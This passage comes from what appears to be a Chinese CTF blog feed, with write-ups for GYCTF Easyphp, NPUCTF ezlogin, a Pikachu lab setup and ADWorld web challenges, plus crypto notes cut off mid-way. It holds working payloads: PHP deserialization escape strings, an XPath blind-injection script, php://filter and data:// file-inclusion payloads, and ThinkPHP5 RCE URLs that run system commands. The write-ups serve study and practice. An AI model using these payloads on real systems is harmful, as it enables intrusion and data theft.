class="line-numbers-rows"><span></span></span></code></pre><br><img src="/2020/12/01/GYCTF2020-Easyphp/1.png" alt><br>虽然那里是263，但是事实上里面没有长度，长度为零</p><p><strong>字符逃逸原理</strong><br>这时候如果我们把整个nickname的payload之前加上263个<code>union</code>，到时过safe()会自动变为<code>hacker</code>，长度增长了263位<br>用个公式总结吧就是</p><blockquote><p>263<em>5+263 = 263</em>6  (263<em>5表示union，+263表示我们需要塞进去的内容；后面的是hacker的263</em>6&lt;因为hacker是6个长，union是5个长&gt;)</p></blockquote><p>所以上传的最终的payload<br><pre class="line-numbers language-php" data-language="php"><code class="language-php">age<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>nickname<span class="token operator">=</span>unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="token double-quoted-string string">";s:8:"</span>CtrlCase<span class="token double-quoted-string string">";O:12:"</span>UpdateHelper<span class="token double-quoted-string string">":1:&#123;s:3:"</span>sql<span class="token double-quoted-string string">";O:4:"</span>User<span class="token double-quoted-string string">":2:&#123;s:3:"</span>age<span class="token double-quoted-string string">";s:70:"</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"c4ca4238a0b923820dcc509a6f75849b"</span> from user where username<span class="token operator">=</span><span class="token operator">?</span><span class="token double-quoted-string string">";s:8:"</span>nickname<span class="token double-quoted-string string">";O:4:"</span>Info<span class="token double-quoted-string string">":1:&#123;s:8:"</span>CtrlCase<span class="token double-quoted-string string">";O:6:"</span>dbCtrl<span class="token double-quoted-string string">":2:&#123;s:4:"</span>name<span class="token double-quoted-string string">";s:5:"</span>admin<span class="token double-quoted-string string">";s:8:"</span>password<span class="token double-quoted-string string">";s:1:"</span><span class="token number">1</span>"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>后面的他自己生成的因为不符合反序列化的规则，此时应该是没用了。</p><p><strong>最后一步</strong><br>在<code>update.php</code>当中POST传入payload，然后再<code>login.php</code>任意密码登录admin账户(注意在同一个浏览器上面进行)，因为最开始的利用点还是从<code>update.php</code>页面开始的。<br><code>flag&#123;f72aca0f-6ed8-433d-862c-b522521283d3&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020-ezlogin</title>
      <link href="2020/11/30/NPUCTF2020-ezlogin/"/>
      <url>2020/11/30/NPUCTF2020-ezlogin/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-判断-amp-注入"><a href="#1-判断-amp-注入" class="headerlink" title="1.判断&amp;注入"></a>1.判断&amp;注入</h2><p>输入用户名密码抓包发现</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>token</span><span class="token punctuation">></span></span>60bc2c51e1afba5e1f8d8896939TYwNj<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>token</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>是XPATH注入，下面给出先知上面关于XPATH注入的详解。<br><a href="https://xz.aliyun.com/t/7791#toc-6">Xpath盲注</a><br>然后可以在用户名这里测试payload<br><pre class="line-numbers language-none"><code class="language-none">&#39;or count(&#x2F;)&#x3D;1  or &#39;&#39;&#x3D;&#39;     ###根节点数量为1&#39;or count(&#x2F;*)&#x3D;1 or &#39;&#39;&#x3D;&#39;   ##根节点下只有一个子节点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><p>然后用户名输入第一个<code>&#39;or count(/)=1 or &#39;&#39;=&#39;</code>显示非法操作，输入<code>&#39;or count(/)=0 or &#39;&#39;=&#39;</code>则显示用户名或密码错误，由此判断可能存在布尔类型盲注，直接写脚本吧，有个token限制了时间。<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> times <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://821c8f01-96e1-4a71-9954-1f22c9e87c88.node3.buuoj.cn'</span>head <span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/xml"</span><span class="token punctuation">&#125;</span>find <span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;input type="hidden" id="token" value="(.*?)" />'</span><span class="token punctuation">)</span>strs <span class="token operator">=</span><span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>flag <span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>        r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>        token <span class="token operator">=</span> find<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>                <span class="token comment">#猜测根节点名称</span>        payload_1 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;' or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment">#猜测子节点名称</span>        payload_2 <span class="token operator">=</span> <span class="token string">"&lt;username>'or substring(name(/root/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment">#猜测accounts的节点</span>        payload_3 <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment">#猜测user节点</span>        payload_4 <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment">#跑用户名和密码</span>        payload_username <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        payload_password <span class="token operator">=</span><span class="token string">"&lt;username>'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;'  or ''='&lt;/username>&lt;password>1&lt;/password>&lt;token>&#123;&#125;&lt;/token>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>token<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token comment">#整合payload</span>        payload <span class="token operator">=</span> payload_password        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"非法操作"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag<span class="token operator">+=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token string">"用户名"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>username:adm1n</code><br><code>password:cf7414b5bdb2e65ee43083f4ddbc4d9f</code>，密码需要md5解密<code>gtfly123</code></p><blockquote><p>布尔盲注，一个查询两个or</p></blockquote><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>文件包含<br><pre class="line-numbers language-none"><code class="language-none">file&#x3D;Php:&#x2F;&#x2F;filter&#x2F;convert.Base64-encode&#x2F;resource&#x3D;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><code>ZmxhZ3tlNDAyZTk0Mi1hNTgzLTQ0OWUtOGQ1MC1lZTlhYzFmNmZiNTN9Cg==</code></p><p><code>flag&#123;e402e942-a583-449e-8d50-ee9ac1f6fb53&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> xpath注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场Pikachu的简单学习</title>
      <link href="2020/11/28/%E9%9D%B6%E5%9C%BAPikachu%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/11/28/%E9%9D%B6%E5%9C%BAPikachu%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天没多少时间了，就不来做题了，今天搞下Pikachu，太菜了，什么时候才能变强呢。。。又菜又笨又爱玩。<br><strong>可以先去BUU开一个pikachu的环境，当然也能自己搭建，自己搭建的话推荐在windows(phpstudy)或者docker上面也许会比较方便。</strong><br><a href="https://buuoj.cn/challenges#PikaChu">BUU之Pikachu环境地址</a></p><h1 id="Pikachu靶场相关介绍及其安装配置"><a href="#Pikachu靶场相关介绍及其安装配置" class="headerlink" title="Pikachu靶场相关介绍及其安装配置"></a>Pikachu靶场相关介绍及其安装配置</h1><p><img src="/2020/11/28/%E9%9D%B6%E5%9C%BAPikachu%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/1.png" alt><br>不好用，还是自己搭一下环境吧。在我的windows里面搭建。</p><h3 id="1-下载源代码"><a href="#1-下载源代码" class="headerlink" title="1.下载源代码"></a>1.下载源代码</h3><p>先从github上面拉下来pikachu的源码<br><a href="https://github.com/zhuifengshaonianhanlu/pikachu">github之Pikachu</a><br><a href="https://gitee.com/wayfeel/pikachu?_from=gitee_search">gitee之Pikachu</a><br>嫌弃github太慢的话可以在码云上面下载，不过要先注册账号，注册应该也浪费不了多长时间。</p><h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h3><p>这里默认你已经安装过phpstudy了，没安可以再去安。</p><ul><li><p>1.把源码解压到WWW目录下，最好让文件夹名为pikachu到时候好找。<br><img src="/2020/11/28/%E9%9D%B6%E5%9C%BAPikachu%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/2.png" alt></p></li><li><p>2.进入inc文件夹下打开<code>config.inc.php</code>文件，修改下数据库的信息我改成了下面的东西</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//全局session_start</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//全局居设置时区</span><span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Asia/Shanghai'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//全局设置默认字符</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//定义数据库连接参数</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'DBHOST'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将localhost或者127.0.0.1修改为数据库服务器的地址</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'DBUSER'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'pikachu'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将root修改为连接mysql的用户名</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'DBPW'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将root修改为连接mysql的密码，如果改了还是连接不上，请先手动连接下你的数据库，确保数据库服务没问题在说！</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'DBNAME'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'pikachu'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//自定义，建议不修改</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'DBPORT'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'3306'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将3306修改为mysql的连接端口，默认tcp3306</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/28/%E9%9D%B6%E5%9C%BAPikachu%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/3.png" alt></p></li><li><p>3.打开PhpStudy后访问<code>http://127.0.0.1/pikachu/</code>界面就一切准备就绪了，但是xss后台界面好像出现了点问题，额，原来还要改，将pkxss目录下的inc目录下的config.inc.php文件的配置信息也修改一下为下面的内容</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//全局session_start</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//全局居设置时区</span><span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Asia/Shanghai'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//全局设置默认字符</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//定义数据库连接参数</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'DBHOST'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'localhost'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将localhost修改为数据库服务器的地址</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'DBUSER'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'pkxss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将root修改为连接mysql的用户名</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'DBPW'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将root修改为连接mysql的密码</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'DBNAME'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'pkxss'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//自定义，建议不修改</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'DBPORT'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'3306'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将3306修改为mysql的连接端口，默认tcp3306</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后新建一个数据库就欧克了。这个xss后台也没啥意思，~可能是我太菜了，呜呜呜~</p></li></ul><p><strong>至此，pikachu渗透环境配置完成</strong></p><h1 id="开始做题"><a href="#开始做题" class="headerlink" title="开始做题"></a>开始做题</h1><h2 id="3-Cross-Site-Scripting-xss跨站脚本攻击"><a href="#3-Cross-Site-Scripting-xss跨站脚本攻击" class="headerlink" title="3.Cross-Site Scripting (xss跨站脚本攻击)"></a>3.Cross-Site Scripting (xss跨站脚本攻击)</h2><p><strong>对一切都不了解，太菜了，菜死了</strong></p><h3 id="0-总介绍"><a href="#0-总介绍" class="headerlink" title="0.总介绍"></a>0.总介绍</h3><p>下面是Pikachu上面给出的关于xss的介绍如下<br><pre class="line-numbers language-none"><code class="language-none">XSS（跨站脚本）概述Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。一般XSS可以分为如下几种常见类型：    1.反射性XSS;    2.存储型XSS;    3.DOM型XSS;XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;你可以通过“Cross-Site Scripting”对应的测试栏目，来进一步的了解该漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="1-反射型xss"><a href="#1-反射型xss" class="headerlink" title="1.反射型xss"></a>1.反射型xss</h3><h4 id="0-攻击介绍"><a href="#0-攻击介绍" class="headerlink" title="0.攻击介绍"></a>0.攻击介绍</h4><p>只能进行一次攻击，我们的恶意代码不会被存储的这种应该叫反射型xss吧。</p><h4 id="1-方法与流程"><a href="#1-方法与流程" class="headerlink" title="1.方法与流程"></a>1.方法与流程</h4><p>如果我们在输入框里面填入<code>&lt;script&gt;&lt;/script&gt;</code>则什么都不会回显，直接插入到我们的html里面了，然后可以可以知道输入内容有长度限制，这里直接F12大法，就能alert(xss)了<br><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>xss<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>直接在url里面传入参数也行，然后直接提交就能弹出窗口啦</p><p>~先睡了，明天还有课，死~</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 练习靶场 </tag>
            
            <tag> 初学者 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ADWord_web进阶</title>
      <link href="2020/11/25/ADWord-web%E8%BF%9B%E9%98%B6/"/>
      <url>2020/11/25/ADWord-web%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>攻防世界web进阶区做题记录</strong></p><h1 id="003-php-rce"><a href="#003-php-rce" class="headerlink" title="003.php rce"></a>003.php rce</h1><p><a href="https://www.cnblogs.com/backlion/p/10106676.html">TP5有漏洞</a><br>任意命令执行RCE<br><pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;ls &#x2F;?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cat &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><h1 id="004-Web-php-include"><a href="#004-Web-php-include" class="headerlink" title="004.Web_php_include"></a>004.Web_php_include</h1><p>方法很多，这里用data伪协议<br><pre class="line-numbers language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;ls&quot;)?&gt;或data:&#x2F;&#x2F;text&#x2F;plain&#x2F;;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;fl4gisisish3r3.php index.php phpinfo.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;tac fl4gisisish3r3.php&quot;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h1 id="005"><a href="#005" class="headerlink" title="005."></a>005.</h1>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ_CRYPTO</title>
      <link href="2020/11/25/BUUOJ-crypto/"/>
      <url>2020/11/25/BUUOJ-crypto/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>偶尔会做些crypto的题目，往后就把解题过程放在这一个文件里了</strong></p><p>[TOC]</p><h1 id="资源整合"><a href="#资源整合" class="headerlink" title="资源整合"></a>资源整合</h1><h2 id="1-密码学网址"><a href="#1-密码学网址" class="headerlink" title="1.密码学网址"></a>1.密码学网址</h2><ul><li><a href="https://blog.csdn.net/weixin_43790779/article/details/108473984">gmpy2库的基本使用</a></li><li><a href="http://www.factordb.com/index.php">factordb在线大整数分解</a></li><li><a href="https://www.guballa.de/vigenere-solver">维吉尼亚无key在线解密</a></li></ul><h2 id="2-知识点"><a href="#2-知识点" class="headerlink" title="2.知识点"></a>2.知识点</h2><h3 id="利用Crypto-PublicKey的RSA模块从文件中获取公钥信息n-e。"><a href="#利用Crypto-PublicKey的RSA模块从文件中获取公钥信息n-e。" class="headerlink" title="利用Crypto.PublicKey的RSA模块从文件中获取公钥信息n,e。"></a>利用Crypto.PublicKey的RSA模块从文件中获取公钥信息n,e。</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSAf <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"key.pub"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>pub <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pub<span class="token punctuation">.</span>n<span class="token punctuation">,</span>pub<span class="token punctuation">.</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="对文件内容解密，集成PKCS1-OAEP"><a href="#对文件内容解密，集成PKCS1-OAEP" class="headerlink" title="对文件内容解密，集成PKCS1_OAEP"></a>对文件内容解密，集成PKCS1_OAEP</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">对文件加密，要用下面的脚本对文件解密<span class="token triple-quoted-string string">"""似乎要用下面封装好的对flag.enc文件内容进行解密，具体原因尚待考究。"""</span>key_info <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>key_info<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> PKCS1_OAEP<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.enc'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> key<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><h2 id="1-古典-Cipher"><a 